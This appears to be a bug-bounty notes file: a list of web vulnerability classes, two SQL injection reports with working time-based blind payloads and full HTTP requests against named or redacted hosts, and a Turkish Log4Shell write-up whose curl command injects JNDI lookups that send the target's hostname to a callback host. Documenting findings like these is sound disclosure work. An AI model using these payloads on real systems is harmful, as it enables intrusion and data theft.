# road

* SSTI (Username and tools)
* sqli 
* File Upload Vulnerabilities
* SSRF Scan
* web cache poisoning
* Os Command Injection
* Path Traversal Injection
* LFI
* 0Auth Injection

```
A1: Injection

A2: Broken Authentication

A3: Sensitive Data Exposure

A4: XML External Entities (XXE)

A5: Broken Access Control

A6: Security Misconfiguration

A7: Cross-Site Scripting (XSS)

A8: Insecure Deserialization

A9: Using Components with Known Vulnerabilities

A10: Insufficient Logging & Monitoring
```
# Sqli Reports 
## 1

I have discovered a SQL injection in https://demor.adr.acronis.com/ using the POST request via the username parameter.
Using the Repearter in Burpsuite I have submitted the following POST request:
```http
POST /ng/api/auth/login HTTP/2
Host: demor.adr.acronis.com
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Referer: https://demor.adr.acronis.com/
Cookie: PHPSESSID=bsrq24l7g5fmth5b683v2b3gu4
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
Accept-Encoding: gzip,deflate,br
Content-Length: 148
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36
{"username":"0'XOR(if(now()=sysdate(),sleep(35),0))XOR'Z","id":"27","password":"cc4226104294e44c5cec9f31cb6de7fa4597e4321b277f4e4b78c3a0ff980956"}
```
Which resulted in a 35 seconds delayed response (one of the print screens, named 35 captured this).
Using various values for the sleep function you get various time responses.
```
0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z => 15.336
0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z => 6.332
0'XOR(if(now()=sysdate(),sleep(3),0))XOR'Z => 3.352
0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z => 15.327
0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z => 6.337
```

I have attached two print screens from burp showing 16 and 35 seconds responses that were used in the payloads.

____________________

## 2 
 -
-

newcodeslayer137 submitted a report to U.S. Dept Of Defense.
June 10, 2023, 9:32am UTC

Description:
found on the websitehttps://████████ weakness is vulnerable to a blind sql injection.
POC: https:/█████████/0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z => 15.896
Tests Payload performed:
```
0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z => 15.896
0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z => 10.740
0'XOR(if(now()=sysdate(),sleep(2),0))XOR'Z => 2.714
0'XOR(if(now()=sysdate(),sleep(1),0))XOR'Z => 1.927
```
Impact
An attacker can use SQL injection to bypass a web application's authentication and authorization mechanisms and retrieve the contents of an entire database. SQLi can also be used to add, modify and delete records in a database, affecting data integrity. Under the right circumstances, SQLi can also be used by an attacker to execute OS commands, which may then be used to escalate an attack even further.
Best regards,
CodeSlayer137
System Host(s)
███
Affected Product(s) and Version(s)
CVE Numbers
Steps to Reproduce
```https:/██████/0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z => 15.896```
Suggested Mitigation/Remediation Actions

___________________________________


______________________________________


Bir gün, uygulamanın içinde bir güvenlik açığı olduğunu fark ettim. Bu güvenlik açığı, internette "Log4Shell" olarak bilinen ve ciddi bir tehdit oluşturan bir problem. Log4j adlı bir yazılım kütüphanesi, internetten gelen verileri işlerken bazı hatalar yapıyor ve bu hatalar, kötü niyetli bir kişinin uzaktan, sanki bilgisayarın başında oturuyormuş gibi komutlar çalıştırmasına olanak tanıyor. Bu problem "CVE-2021-44228" koduyla tanımlanmış.

Neler Yaptım:

Bu açığı test etmek için bir yöntem buldum. Bu yöntemde Burp Collaborator adlı bir aracı kullandım. Bu araç, uygulamanın internet üzerinden verdiği tepkileri izlememi sağlıyor.

İlk olarak, bu aracı kullanarak bir komut oluşturdum. Bu komut, belirli bir internet adresine (COLLABORATOR_URL) bir istek gönderiyor. Komutu şu şekilde yazdım:

bash
Kodu kopyala
curl --http1.1 --silent --output /dev/null \
--header 'User-agent: ${jndi:ldap://${hostName}.<COLLABORATOR_URL>/a}' \
--header 'X-Forwarded-For: ${jndi:ldap://${hostName}.<COLLABORATOR_URL>/a}' \
--header 'Referer: ${jndi:ldap://${hostName}.<COLLABORATOR_URL>/a}' \
https://ng01-cloud.acronis.com
Bu Komut Ne Yapar?

Bu komut, belirli başlıklar (User-agent, X-Forwarded-For, Referer) kullanarak uygulamaya istek gönderiyor. Başlıkların içindeki ${jndi:ldap://...} kısmı ise, uygulamanın içindeki Log4j kütüphanesine "Bir internet adresine git ve oradan bazı bilgiler al" diyor.

Eğer bu açığın olduğu bir uygulamaya bu komutu gönderirseniz, Log4j kütüphanesi bu isteği işlerken benim belirttiğim internet adresine bir bağlantı yapmaya çalışıyor. Bu bağlantı başarılı olursa, bu uygulamanın zafiyeti olduğunu kanıtlamış oluyorum.

Sonuç:

Uygulama bana kendi sistem adını (hostname) gönderdi. Bu, uygulamanın dışarıdan gelen bu tehlikeli isteği işlediğini ve sonuç olarak sistemde uzaktan komut çalıştırmanın mümkün olduğunu gösterdi.

Etkisi:

Bu açıktan faydalanan kötü niyetli biri, uygulamaya uzaktan komutlar gönderip, bu komutları sistem üzerinde çalıştırabilir. Bu, sistemin tamamen ele geçirilmesine kadar varabilecek ciddi güvenlik riskleri oluşturur.


